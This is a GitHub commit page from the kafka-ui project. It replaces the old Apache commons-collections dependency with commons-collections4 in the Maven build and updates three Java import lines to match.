  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -81,6 +81,12 @@ |
|  |  | <groupId>io.confluent</groupId> |
|  |  | <artifactId>kafka-json-schema-serializer</artifactId> |
|  |  | <version>${confluent.version}</version> |
|  |  | <exclusions> |
|  |  | <exclusion> |
|  |  | <groupId>commons-collections</groupId> |
|  |  | <artifactId>commons-collections</artifactId> |
|  |  | </exclusion> |
|  |  | </exclusions> |
|  |  | </dependency> |
|  |  | <dependency> |
|  |  | <groupId>io.confluent</groupId> |
| Expand Down  Expand Up | | @@ -135,6 +141,11 @@ |
|  |  | <artifactId>commons-pool2</artifactId> |
|  |  | <version>${apache.commons.version}</version> |
|  |  | </dependency> |
|  |  | <dependency> |
|  |  | <groupId>org.apache.commons</groupId> |
|  |  | <artifactId>commons-collections4</artifactId> |
|  |  | <version>4.4</version> |
|  |  | </dependency> |
|  |  | <dependency> |
|  |  | <groupId>org.testcontainers</groupId> |
|  |  | <artifactId>testcontainers</artifactId> |
| Expand Down  Expand Up | | @@ -238,8 +249,6 @@ |
|  |  | <groupId>org.springframework.security</groupId> |
|  |  | <artifactId>spring-security-ldap</artifactId> |
|  |  | </dependency> |
|  |  |  |
|  |  |  |
|  |  | <dependency> |
|  |  | <groupId>org.codehaus.groovy</groupId> |
|  |  | <artifactId>groovy-jsr223</artifactId> |
| Expand Down | |  |

2 changes: 1 addition & 1 deletion

2
[kafka-ui-api/src/main/java/com/provectus/kafka/ui/model/rbac/Permission.java](#diff-93df69e657cc397dc99ce332bc47cfc3b6579ca6b17ab54fa6275da75f319807 "kafka-ui-api/src/main/java/com/provectus/kafka/ui/model/rbac/Permission.java")

Show comments

[View file](/provectus/kafka-ui/blob/83b5a60cc08501b570a0c4d0b4cdfceb1b88d6b7/kafka-ui-api/src/main/java/com/provectus/kafka/ui/model/rbac/Permission.java)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -23,7 +23,7 @@ |
|  |  | import lombok.EqualsAndHashCode; |
|  |  | import lombok.Getter; |
|  |  | import lombok.ToString; |
|  |  | import org.apache.commons.collections.CollectionUtils; |
|  |  | import org.apache.commons.collections4.CollectionUtils; |
|  |  | import org.springframework.util.Assert; |
|  |  |  |
|  |  | @Getter |
| Expand Down | |  |

2 changes: 1 addition & 1 deletion

2
[kafka-ui-api/src/main/java/com/provectus/kafka/ui/service/integration/odd/ConnectorInfo.java](#diff-ac0c0ab6073590260599beec5718d564bcda79a01043970ae6d42a0e20ec693f "kafka-ui-api/src/main/java/com/provectus/kafka/ui/service/integration/odd/ConnectorInfo.java")

Show comments

[View file](/provectus/kafka-ui/blob/83b5a60cc08501b570a0c4d0b4cdfceb1b88d6b7/kafka-ui-api/src/main/java/com/provectus/kafka/ui/service/integration/odd/ConnectorInfo.java)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -8,7 +8,7 @@ |
|  |  | import java.util.function.Function; |
|  |  | import java.util.stream.Stream; |
|  |  | import javax.annotation.Nullable; |
|  |  | import org.apache.commons.collections.CollectionUtils; |
|  |  | import org.apache.commons.collections4.CollectionUtils; |
|  |  | import org.opendatadiscovery.oddrn.JdbcUrlParser; |
|  |  | import org.opendatadiscovery.oddrn.model.HivePath; |
|  |  | import org.opendatadiscovery.oddrn.model.MysqlPath; |
| Expand Down | |  |

2 changes: 1 addition & 1 deletion

2
[kafka-ui-api/src/main/java/com/provectus/kafka/ui/service/rbac/AccessControlService.java](#diff-37e769f4709c1e78c076a5949bbcead74e969725bfd89c7c4ba6d6f229a411e6 "kafka-ui-api/src/main/java/com/provectus/kafka/ui/service/rbac/AccessControlService.java")

Show comments

[View file](/provectus/kafka-ui/blob/83b5a60cc08501b570a0c4d0b4cdfceb1b88d6b7/kafka-ui-api/src/main/java/com/provectus/kafka/ui/service/rbac/AccessControlService.java)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -33,7 +33,7 @@ |
|  |  | import javax.annotation.Nullable; |
|  |  | import lombok.RequiredArgsConstructor; |
|  |  | import lombok.extern.slf4j.Slf4j; |
|  |  | import org.apache.commons.collections.CollectionUtils; |
|  |  | import org.apache.commons.collections4.CollectionUtils; |
|  |  | import org.apache.commons.lang3.StringUtils; |
|  |  | import org.springframework.boot.context.properties.EnableConfigurationProperties; |
|  |  | import org.springframework.core.env.Environment; |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 1 comment on commit `83b5a60`

[![@SaadkhPy](https://avatars.githubusercontent.com/u/175509604?s=80&v=4)](/SaadkhPy)

Copy link

### @SaadkhPy **[SaadkhPy](/SaadkhPy)** commented on `[83b5a60](/provectus/kafka-ui/commit/83b5a60cc08501b570a0c4d0b4cdfceb1b88d6b7)` [Jan 3, 2025](#commitcomment-150889642)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

chenge

Sorry, something went wrong.

All reactions

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fprovectus%2Fkafka-ui%2Fcommit%2F83b5a60cc08501b570a0c4d0b4cdfceb1b88d6b7) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


